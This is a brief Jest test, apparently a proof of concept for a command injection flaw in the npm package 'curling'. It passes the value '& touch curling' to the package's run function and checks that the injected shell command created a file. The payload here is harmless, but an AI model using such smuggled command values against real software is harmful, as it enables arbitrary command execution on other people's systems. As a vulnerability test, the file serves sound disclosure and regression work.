//https://meet.google.com/wjg-fngp-nco
test("Command Injection in curling", () => {
  const root = require("curling");
  const fs = require("fs");
  const path = "./curling";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root.run("& touch curling", function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
